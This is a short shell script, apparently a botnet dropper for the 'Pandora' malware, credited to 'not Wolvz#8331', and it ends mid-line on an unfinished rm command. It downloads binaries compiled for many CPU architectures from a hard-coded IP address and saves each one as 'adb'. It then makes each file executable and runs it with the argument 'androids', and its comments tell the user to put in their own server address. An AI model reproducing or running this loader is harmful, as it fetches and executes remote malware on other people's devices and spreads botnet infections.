#!/bin/sh 
# made by not Wolvz#8331
# CHANGE TO YOUR NET IP
WEBSERVER="185.244.25.72:80"
# CHANGE TO YOUR NET pandora

BINARIES="pandora.x86 pandora.mips pandora.mpsl pandora.arm pandora.arm5 pandora.arm6 pandora.arm7 pandora.ppc pandora.m68k pandora.sh4"

for Binary in $BINARIES; do
	wget http://$WEBSERVER/Pandoras_Box/$Binary -O adb
	chmod 777 adb
	./adb androids
done

rm -f "